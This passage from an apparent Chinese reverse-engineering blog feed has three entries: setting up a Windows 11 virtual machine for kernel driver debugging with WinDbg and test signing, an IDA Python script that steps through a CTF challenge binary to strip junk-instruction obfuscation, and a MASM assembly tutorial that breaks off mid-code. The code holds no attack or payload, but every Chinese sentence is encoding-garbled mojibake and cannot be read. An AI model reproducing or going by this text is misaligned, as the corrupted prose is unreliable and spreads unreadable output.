x64-x64_en-us.msi</code>è¿™ä¸ªæ–‡ä»¶</p><p>ç„¶åvsæ‰“å¼€é¡¹ç›®çš„æ‰©å±•-driver-Test-Configure Devicesâ€¦æ·»åŠ å¯¹åº”ä¸»æœºåæˆ–ip</p><p>ç„¶åè®¾ç½®ä¸ºç›®æ ‡è®¡ç®—æœº</p><p><img src="https://s2.loli.net/2025/03/06/xT5iMW9stkQ6uJd.png" alt="image-20250306153628068"></p><h3 id="è°ƒè¯•">è°ƒè¯•</h3><p>è™šæ‹Ÿæœºä¸­å¼€å¯æµ‹è¯•æ¨¡å¼</p><p>å¯¹äºä¸Šé¢æ˜¾ç¤ºçš„keyå’Œportï¼Œå®¿ä¸»æœºä¸­</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./Windbg <span class="literal">-k</span> net:port=xxx,key=xxx</span><br></pre></td></tr></table></figure><p>åœ¨C:\Program Files (x86)\Windows Kits\10\Debuggers\x64ä¸‹æ‰§è¡Œ</p><h2 id="å…³äºéƒ¨ç½²é©±åŠ¨å’Œåœ¨vsä¸­è°ƒè¯•çš„æŠ¥é”™">å…³äºéƒ¨ç½²é©±åŠ¨å’Œåœ¨vsä¸­è°ƒè¯•çš„æŠ¥é”™</h2><h3 id="ç¼–è¯‘æœŸæŠ¥é”™ï¼šéœ€è¦ç¼“è§£åº“æˆ–è€…è¯­æ³•é”™è¯¯">ç¼–è¯‘æœŸæŠ¥é”™ï¼šéœ€è¦ç¼“è§£åº“æˆ–è€…è¯­æ³•é”™è¯¯</h3><p>ç¡®ä¿ç¼“è§£åº“ç‰ˆæœ¬å’Œå·¥å…·é“¾ç‰ˆæœ¬ä¸€è‡´ï¼Œå¦‚æœæ˜¯æœ€æ–°ï¼Œéœ€è¦åœ¨é¡¹ç›®å±æ€§ä¸­æ‰¾åˆ°MVCSç‰ˆæœ¬ï¼Œè°ƒæ•´ä¸ºæ‰€æœ‰å¯é€‰ç‰ˆæœ¬ä¸­æœ€æ–°çš„ç‰ˆæœ¬ï¼Œè€Œä¸æ˜¯é»˜è®¤</p><p>è¯­æ³•é”™è¯¯éœ€è¦æ£€æŸ¥ç¼–ç ï¼Œå°è¯•ä»¥UTF8å­˜å‚¨æˆ–è€…GBKï¼Œå¤šè¯•å‡ ä¸ªåº”è¯¥å°±å¥½äº†</p><h3 id="æŠ¥é”™ï¼šç¬¬ä¸‰æ–¹infä¸åŒ…å«æ•°å­—ç­¾åä¿¡æ¯">æŠ¥é”™ï¼šç¬¬ä¸‰æ–¹infä¸åŒ…å«æ•°å­—ç­¾åä¿¡æ¯</h3><p>éœ€è¦ç”Ÿæˆcrtè¯ä¹¦æ–‡ä»¶ï¼Œé¡¹ç›®ï¼Œå±æ€§ï¼ŒInf2Catï¼ŒRun Inf2Cat æ”¹ä¸ºæ˜¯<br>å±æ€§ï¼ŒDriver Signingä¸­Sign Modeæ”¹ä¸ºTest Sign<br>è™šæ‹Ÿæœºå¼€å¯æµ‹è¯•æ¨¡å¼</p><h3 id="Windbgæ— æ³•è°ƒè¯•ï¼Œæ‰“å¼€ä¸€ç›´æ˜¾ç¤ºWaiting-to-reconnectâ€¦">Windbgæ— æ³•è°ƒè¯•ï¼Œæ‰“å¼€ä¸€ç›´æ˜¾ç¤ºWaiting to reconnectâ€¦</h3><p>é¦–å…ˆç¡®ä¿è™šæ‹Ÿæœºè°ƒè¯•æ¨¡å¼ä¸€æ‰“å¼€ï¼Œå¦‚æœvsä¸­è®¾ç½®å¥½äº†portå’Œkeyï¼Œä¸”è™šæ‹Ÿæœºä¸­<br><code>bcdedit /dbgsettings</code>æŸ¥çœ‹è®¾ç½®æ˜¯å¦ç›¸åŒï¼Œå¦‚æœç›¸åŒï¼Œå°è¯•å…³é—­è™šæ‹Ÿæœºçš„è°ƒè¯•æ¨¡å¼å†æ‰“å¼€ï¼Œé‡å¤ä¸¤ä¸‰æ¬¡ï¼Œç„¶åå†å°è¯•ï¼ˆè¿™ä¸ªè¢«å‘äº†å¥½ä¹…ï¼Œæœ€åè¿˜æ˜¯å­¦é•¿å¸®æˆ‘é…å¥½çš„ï¼‰</p><h3 id="driverqueryæ— æ³•çœ‹åˆ°å¯¹åº”çš„é©±åŠ¨">driverqueryæ— æ³•çœ‹åˆ°å¯¹åº”çš„é©±åŠ¨</h3><p>æŸ¥çœ‹å½“å‰é©±åŠ¨æ˜¯ä¸æ˜¯ç¡¬ä»¶é©±åŠ¨ï¼Œåœ¨è®¾å¤‡ç®¡ç†å™¨ä¸­é€‰æ‹©æŒ‰é©±åŠ¨åˆ†ç±»ï¼Œå¯ä»¥æ‰¾åˆ°è‡ªå·±å®‰è£…çš„é©±åŠ¨ï¼Œæƒ³è¦çœ‹è¿™ç§é©±åŠ¨çš„å€¼ï¼Œå¯ä»¥é€šè¿‡é©±åŠ¨æ³¨å…¥ç¨‹åºå¼ºåˆ¶å®‰è£…ï¼Œç„¶ååœ¨dbgviewä¸­çœ‹åˆ°æ•ˆæœã€‚å¦‚æœæ˜¯å¾®è½¯å†™çš„æŠ½è±¡helloworldä»£ç ï¼Œå› ä¸ºæ²¡å†™å¸è½½å‡½æ•°ï¼Œæ‰€ä»¥ä¸èƒ½å¸è½½ã€‚ä¸å¦‚ç”¨ä¸‹é¢è¿™ä¸ªåšæµ‹è¯•(ç”¨wdmé¡¹ç›®)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntifs.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">VOID <span class="title function_">DriverUnload</span><span class="params">(PDRIVER_OBJECT pdriverObject)</span></span><br><span class="line">&#123;</span><br><span class="line">DbgPrint(<span class="string">&quot;DriverUnload\r\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">NTSTATUS <span class="title function_">DriverEntry</span><span class="params">(PDRIVER_OBJECT pDriverObject,</span></span><br><span class="line"><span class="params">PUNICODE_STRING pRegPath<span class="comment">//æ³¨å†Œè¡¨è·¯å¾„</span></span></span><br><span class="line"><span class="params">)</span></span><br><span class="line">&#123;</span><br><span class="line">DbgPrint(<span class="string">&quot;DriverEntry\r\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pDriverObject-&gt;DriverUnload = DriverUnload;<span class="comment">//æŒ‡å®šé©±åŠ¨å¸è½½å‡½æ•°</span></span><br><span class="line"><span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¤ªæŠ½è±¡äº†ï¼Œè¿™ä¸ªç¯å¢ƒé…äº†6å¤©TATï¼Œæ„Ÿè°¢ <span class='nota' data-nota='å¡å¯†'>å­¦é•¿</span> å¸®æˆ‘ã€‚</p>]]></content>
    
    
    <summary type="html">é…ç½®win11è™šæ‹Ÿæœºä»¥é€‚é…è°ƒè¯•é©±åŠ¨ç¯å¢ƒ</summary>
    
    
    
    <category term="å®è·µ" scheme="https://www.pri87.vip/categories/%E5%AE%9E%E8%B7%B5/"/>
    
    <category term="è®°å½•" scheme="https://www.pri87.vip/categories/%E5%AE%9E%E8%B7%B5/%E8%AE%B0%E5%BD%95/"/>
    
    
  </entry>
  
  <entry>
    <title>IDAè‡ªåŠ¨åŒ–è°ƒè¯•</title>
    <link href="https://www.pri87.vip/posts/9be53c83.html"/>
    <id>https://www.pri87.vip/posts/9be53c83.html</id>
    <published>2025-03-04T14:52:26.000Z</published>
    <updated>2025-03-05T09:29:15.629Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€">å‰è¨€</h2><p>ä¹‹å‰ä¸€ç›´æƒ³æ‰¾ä¸ªæ–¹æ³•å®ç°IDAè°ƒè¯•çš„æ—¶å€™è‡ªåŠ¨æ‰§è¡Œæ“ä½œï¼Œç°åœ¨ç»ˆäºæ‰¾åˆ°äº†</p><p>idaé‡Œé¢æœ‰ä¸€ä¸ªapiï¼šida_dbg.step_into()ï¼Œæ•ˆæœæ˜¯æ‰§è¡Œä¸€æ¬¡æ­¥å…¥ï¼Œé€šè¿‡å¾ªç¯è¿™ä¸ªæŒ‡ä»¤å°±å¯ä»¥å®ç°è‡ªåŠ¨æ­¥å…¥çš„æ•ˆæœï¼Œåœ¨æ­¥è¿‡åå†™è‡ªå·±éœ€è¦çš„æ•ˆæœå°±å¥½</p><h2 id="å®ç°">å®ç°</h2><p>ä¸‹é¢æ˜¯ä¸€ä¸ªå¯¹äºdasctfï¼ŒBabyEncçš„æŒ‡ä»¤è¿˜åŸè„šæœ¬ï¼Œè¿™ä¸ªé¢˜å°†çœŸçš„é€»è¾‘ç”¨æ±‡ç¼–å†™äº†å‡ºæ¥ï¼Œå¹¶æŠŠæ¯å¥æ±‡ç¼–æ”¾åœ¨æ ¼å¼ç›¸åŒçš„èŠ±æŒ‡ä»¤ä¸­ï¼Œé€šè¿‡ä¸‹é¢è¿™ä¸ªè„šæœ¬å¯ä»¥æå–æ¯ç»„æ±‡ç¼–ä¸­çš„çœŸå®ä»£ç ï¼Œç»„åˆæˆä¸€ä¸ªå‡½æ•°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> idc <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> idaapi</span><br><span class="line"><span class="keyword">import</span> idautils</span><br><span class="line"><span class="keyword">import</span> ida_dbg</span><br><span class="line"></span><br><span class="line">statx = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_address</span>(<span class="params">target_ea</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;trace_output.bin&quot;</span>, <span class="string">&quot;ab&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            ida_dbg.wait_for_next_event(ida_dbg.WFNE_SUSP, -<span class="number">1</span>)<span class="comment">#åœ¨è·å–å†…å­˜/å¯„å­˜å™¨/çŠ¶æ€å’Œæ‰§è¡Œ(f4,f7,f8,f9)ä¹‹é—´å¿…é¡»æœ‰è¿™è¡Œï¼Œidaæ˜¯å•çº¿ç¨‹ï¼Œå¿…é¡»ç­‰å¾…è°ƒè¯•å™¨è·å–åˆ°çŠ¶æ€ä¹‹åå†å–å†…å®¹</span></span><br><span class="line">            current_ea = ida_dbg.get_reg_val(<span class="string">&quot;EIP&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> current_ea == target_ea:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;finished&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                handle_instruction(current_ea, f)</span><br><span class="line">                ida_dbg.step_into()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handle_instruction</span>(<span class="params">ea, file</span>):</span><br><span class="line">    <span class="keyword">global</span> statx</span><br><span class="line">    statx-=<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span>(statx &lt;= <span class="number">0</span>):<span class="comment">#å‡å°‘æ—¶é—´ï¼ŒidaæŒ‡ä»¤éœ€è¦æ—¶é—´</span></span><br><span class="line">        instr = idc.GetDisasm(ea)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;jmp     ebx&quot;</span> <span class="keyword">in</span> instr:<span class="comment">#åœ¨æ¯å—çš„ç»“å°¾æ‰§è¡Œ</span></span><br><span class="line">            statx = <span class="number">11</span></span><br><span class="line">            count = <span class="number">0</span></span><br><span class="line">            ea_temp = ea</span><br><span class="line">            prev_instr = <span class="string">&quot;&quot;</span></span><br><span class="line">            <span class="keyword">while</span> count &lt; <span class="number">11</span>:<span class="comment">#å‘ä¸Šæ‰¾ç¬¬åä¸€è¡Œä»£ç </span></span><br><span class="line">                ea_temp = idc.prev_head(ea_temp)</span><br><span class="line">                prev_instr = idc.GetDisasm(ea_temp)</span><br><span class="line">                count += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;popa&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> prev_instr <span class="keyword">and</span> <span class="string">&quot;cmp&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> prev_instr:<span class="comment">#è¿‡æ»¤è·³è½¬æŒ‡ä»¤</span></span><br><span class="line">                machine_code = ida_bytes.get_bytes(ea_temp, idc.get_item_size(ea_temp))</span><br><span class="line">                file.write(machine_code)</span><br><span class="line">                <span class="built_in">print</span>(prev_instr)</span><br><span class="line"></span><br><span class="line">check_address(<span class="number">0x0041F082</span>)</span><br></pre></td></tr></table></figure><p>å¦ä¸€ç§å®ç°æ˜¯ä¾èµ–æ–­ç‚¹çš„å®ç°ï¼Œç»§æ‰¿DBG_hookså®ç°æ–­ç‚¹é’©å­ï¼Œéœ€è¦å‡†ç¡®çŸ¥é“åœ¨å“ªé‡Œä¸‹æ–­ç‚¹æ‰è¡Œï¼Œæ„Ÿè§‰æœ‰ç‚¹éº»çƒ¦ï¼Œä¸è¿‡è¦æ˜¯èƒ½ç®—å‡ºæ¥å…·ä½“çš„ä½ç½®ï¼Œé‚£ä¹Ÿå¾ˆç®€å•ï¼Œé€Ÿåº¦ä¹Ÿæ›´å¿«</p><h2 id="ç¼ºç‚¹">ç¼ºç‚¹</h2><p>éœ€è¦çš„æ—¶é—´å¤ªé•¿äº†ï¼Œå°¤å…¶æ˜¯åœ¨æœ‰é•¿èŠ±æŒ‡ä»¤çš„æƒ…å†µä¸‹ï¼Œè¿™æ®µä»£ç å¤§æ¦‚æ‰§è¡Œäº†90åˆ†é’Ÿå·¦å³ï¼Œä½†æ˜¯æ²¡æœ‰èŠ±æŒ‡ä»¤ä¸€èˆ¬å¥½åƒä¹Ÿä¸éœ€è¦è¿™ç§æ“ä½œ(ä¹Ÿè®¸æ§åˆ¶æµæ··æ·†éœ€è¦ï¼Ÿ)ã€‚ä¸è¿‡å¦å¤–ä¸€æ–¹é¢ï¼Œç¼–å†™è¿™ç§è„šæœ¬ä¸éœ€è¦è„‘å­ï¼Œä¸éœ€è¦ä¸»åŠ¨è·å–å¯„å­˜å™¨çš„å€¼ï¼Œæ¨¡æ‹Ÿæ‰§è¡Œå¯èƒ½å†™çš„æœ‰åå·®ï¼Œä½†æ˜¯è¿™ç§å°±è‚¯å®šä¸ä¼šé”™ã€‚</p>]]></content>
    
    
    <summary type="html">IDAçš„è‡ªåŠ¨åŒ–è°ƒè¯•</summary>
    
    
    
    <category term="çŸ¥è¯†é›†" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/"/>
    
    <category term="é€†å‘" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E9%80%86%E5%90%91/"/>
    
    <category term="è‡ªåŠ¨åŒ–é€†å‘" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E9%80%86%E5%90%91/%E8%87%AA%E5%8A%A8%E5%8C%96%E9%80%86%E5%90%91/"/>
    
    
    <category term="IDA" scheme="https://www.pri87.vip/tags/IDA/"/>
    
  </entry>
  
  <entry>
    <title>MASMæ±‡ç¼–</title>
    <link href="https://www.pri87.vip/posts/dfd755e7.html"/>
    <id>https://www.pri87.vip/posts/dfd755e7.html</id>
    <published>2025-02-28T10:42:42.000Z</published>
    <updated>2025-03-05T09:30:54.091Z</updated>
    
    <content type="html"><![CDATA[<h2 id="x16åŸºæœ¬æ ¼å¼">x16åŸºæœ¬æ ¼å¼</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line"></span><br><span class="line">code segment;æŒ‡å®šæ®µ</span><br><span class="line"></span><br><span class="line">int 21h;é€€å‡º</span><br><span class="line">code ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure><h2 id="x86åŸºæœ¬æ ¼å¼">x86åŸºæœ¬æ ¼å¼</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">.586;æŒ‡å®šæŒ‡ä»¤é›†ç‰ˆæœ¬</span><br><span class="line">.model flat,stdcall;è®¾ç½®å†…å­˜æ¨¡å‹å’Œè°ƒç”¨çº¦å®š:_edecl,_stdcall,_fastcallï¼Œ_thiscall</span><br><span class="line">option casemap:none;åŒºåˆ†å¤§å°å†™</span><br><span class="line"></span><br><span class="line">includelib ucrt.lib;å¯¼å…¥cç›¸å…³æ ‡å‡†åº“</span><br><span class="line">includelib legacy_stdio_definitions.lib;å¯¼å…¥cç›¸å…³åº“</span><br><span class="line"></span><br><span class="line">includelib Kernel32.lib</span><br><span class="line">includelib User32.lib</span><br><span class="line"></span><br><span class="line">MessageBoxA proto hwnd:DWORD,lpText:BYTE,lpCaption:BYTE,uType:DWORD</span><br><span class="line">ExitProcess proto uCode:DWORD</span><br><span class="line"></span><br><span class="line">extern printf:proc;å£°æ˜å¤–éƒ¨å‡½æ•°</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.data;æŒ‡å®šæ®µ</span><br><span class="line">szFormat db &#x27;%d&#x27;, 0</span><br><span class="line"></span><br><span class="line">.code;æŒ‡å®šæ®µ</span><br><span class="line">main proc</span><br><span class="line">mov eax,64h</span><br><span class="line">push eax;å‡½æ•°è°ƒç”¨</span><br><span class="line">lea ecx,szFormat</span><br><span class="line">push ecx</span><br><span class="line">call printf</span><br><span class="line">add esp,8;cæ ‡å‡†</span><br><span class="line"></span><br><span class="line">push 0</span><br><span class="line">push 0</span><br><span class="line">push 0</span><br><span class="line">push 0</span><br><span class="line">call MessageBoxA;</span><br><span class="line">push 0</span><br><span class="line">call ExitProcess;winæ ‡å‡† æˆ–è€…å¯ä»¥å†™invoke ExitProcess,0</span><br><span class="line">main endp</span><br><span class="line">end</span><br></pre></td></tr></table></figure><h3 id="æ±‡ç¼–å¤´æ–‡ä»¶-inc">æ±‡ç¼–å¤´æ–‡ä»¶(.inc)</h3><p>åŒ…å«å¤´æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include header.inc</span><br></pre></td></tr></table></figure><h3 id="ä¼ªæŒ‡ä»¤">ä¼ªæŒ‡ä»¤</h3><h4 id="invoke">invoke</h4><p>ä½¿ç”¨å‰å¿…é¡»å…ˆå®šä¹‰ï¼Œæ¯”å¦‚ä¸Šé¢çš„<code>ExitProcess proto uCode:DWORD</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">invoke farproc,para1,para2,...</span><br></pre></td></tr></table></figure><p>åªèƒ½ç”¨äºwin32 api</p><p><a href="https://masm32.com/download.htm">Download The MASM32 SDK</a>ä¸‹è½½MASM32SDK</p><p>æ•ˆæœæ˜¯å¯ä»¥ç›´æ¥å¯¼å…¥å·²ç»å®šä¹‰å¥½çš„å‡½æ•°ï¼Œå¯ä»¥ç›´æ¥invoke</p><p>åœ¨é¡¹ç›®å±æ€§ä¸­Microsoft Macro Assembler-include Pathsä¸­é™„åŠ MASMä¸­çš„includeç›®å½•ï¼Œç„¶åå¯ä»¥ç›´æ¥è¿™æ ·ä½¿ç”¨å‡½æ•°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">.586;æŒ‡å®šæŒ‡ä»¤é›†ç‰ˆæœ¬</span><br><span class="line">.model flat,stdcall;è®¾ç½®å†…å­˜æ¨¡å‹å’Œè°ƒç”¨çº¦å®š:_edecl,_stdcall,_fastcallï¼Œ_thiscall</span><br><span class="line">option casemap:none;åŒºåˆ†å¤§å°å†™</span><br><span class="line"></span><br><span class="line">includelib ucrt.lib;å¯¼å…¥cç›¸å…³æ ‡å‡†åº“</span><br><span class="line">includelib legacy_stdio_definitions.lib;å¯¼å…¥cç›¸å…³åº“</span><br><span class="line"></span><br><span class="line">include Kernel32.inc</span><br><span class="line">include User32.inc</span><br><span class="line"></span><br><span class="line">includelib Kernel32.lib</span><br><span class="line">includelib User32.lib</span><br><span class="line"></span><br><span class="line">extern printf:proc;å£°æ˜å¤–éƒ¨å‡½æ•°</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.data;æŒ‡å®šæ®µ</span><br><span class="line">szFormat db &#x27;%d&#x27;, 0</span><br><span class="line"></span><br><span class="line">.code</span><br><span class="line">main proc</span><br><span class="line">mov eax,64h</span><br><span class="line">push eax;å‡½æ•°è°ƒç”¨</span><br><span class="line">lea ecx,szFormat</span><br><span class="line">push ecx</span><br><span class="line">call printf</span><br><span class="line">add esp,8;cæ ‡å‡†</span><br><span class="line"></span><br><span class="line">push 0</span><br><span class="line">push 0</span><br><span class="line">push 0</span><br><span class="line">push 0</span><br><span class="line">call MessageBoxA;</span><br><span class="line">push 0</span><br><span class="line">call ExitProcess;winæ ‡å‡† æˆ–è€…å¯ä»¥å†™invoke ExitProcess,0</span><br><span class="line">main endp</span><br><span class="line"></span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>å¯¹äºè‡ªå·±å®šä¹‰çš„å‡½æ•°ï¼Œä½¿ç”¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">addx proc numA:dword,numB:dword</span><br><span class="line">xor eax,eax</span><br><span class="line">add eax,numA</span><br><span class="line">add eax,numB</span><br><span class="line">ret</span><br><span class="line">addx endp</span><br></pre></td></tr></table></figure><p>è¿™æ ·çš„æ ¼å¼ï¼Œä¹Ÿå¯ä»¥ç”¨invokeè°ƒç”¨ï¼Œå¯¹äºCåº“çš„cstdå‡½æ•°ï¼Œå¯ä»¥é€šè¿‡è¿™ä¸ªæ–¹å¼è¿›è¡Œä¸€æ¬¡stdçš„å°è£…ã€‚</p><h4 id="if">if</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">main proc</span><br><span class="line">mov dwIndex,11</span><br><span class="line">    .if dwIndex== 10</span><br><span class="line">    mov dwNumber,10</span><br><span class="line">    invoke printNumber,dwNumber</span><br><span class="line">    .elseif deIndex &gt;= 12</span><br><span class="line">    mov dwNumber,12</span><br><span class="line">    invoke printNumber,dwNumber</span><br><span class="line">    .else</span><br><span class="line">    mov dwNumber,0</span><br><span class="line">    invoke printNumber,dwNumber</span><br><span class="line">    .endif</span><br><span class="line">main endp</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">.break;è·³å‡ºå¾ªç¯</span><br><span class="line">.continue;è·³åˆ°æ¡ä»¶æ£€æŸ¥</span><br></pre></td></tr></table></figure><h4 id="while">while</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov dwIndex,100</span><br><span class="line">.while dwIndex&gt;0</span><br><span class="line">dec deIndex</span><br><span class="line">.endw</span><br></pre></td></tr></table></figure><h3 id="å®">å®</h3><p>æ— å‚å®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AAA EQU 100</span><br></pre></td></tr></table></figure><p>å°†AAAå½“100</p><p>æœ‰å‚å®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">;å®šä¹‰</span><br><span class="line">MyAdd MACRO n1</span><br><span class="line">add eax,n1</span><br><span class="line">endm</span><br><span class="line">;ä½¿ç”¨</span><br><span class="line">MyAdd &lt;1&gt;;ç®€å•å‚æ•°ä¹Ÿå¯ä»¥ç›´æ¥MyAdd 1</span><br><span class="line"></span><br><span class="line">MyAdd2 MACRO reg,n1</span><br><span class="line">add reg,n1</span><br><span class="line">endm</span><br><span class="line"></span><br><span class="line">MyAdd eax,10</span><br></pre></td></tr></table></figure><h3 id="ç»“æ„ä½“">ç»“æ„ä½“</h3><p>åœ¨dataæ®µå¤–å£°æ˜</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Point struct;å£°æ˜</span><br><span class="line">x word ?</span><br><span class="line">y word ?</span><br><span class="line">Point ends</span><br><span class="line"></span><br><span class="line">.data</span><br><span class="line">MyPoint Point&lt;?&gt;;ä¸åˆå§‹åŒ–å®šä¹‰</span><br><span class="line"></span><br><span class="line">.code</span><br><span class="line">main proc</span><br><span class="line">    mov MyPoint.x,123</span><br><span class="line">    mov MyPoint.y,456</span><br><span class="line">main endp</span><br><span class="line">end</span><br></pre></td></tr></table></figure><h3 id="å†…è”æ±‡ç¼–">å†…è”æ±‡ç¼–</h3><p>vsä¸­å¯ä»¥åœ¨cå’Œcppä¸­ä½¿ç”¨å†…è”æ±‡ç¼–</p><p>x86ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_asm&#123;</span><br><span class="line">push MB_OK;å¯ä»¥ç›´æ¥ä¼ å®</span><br><span class="line">call 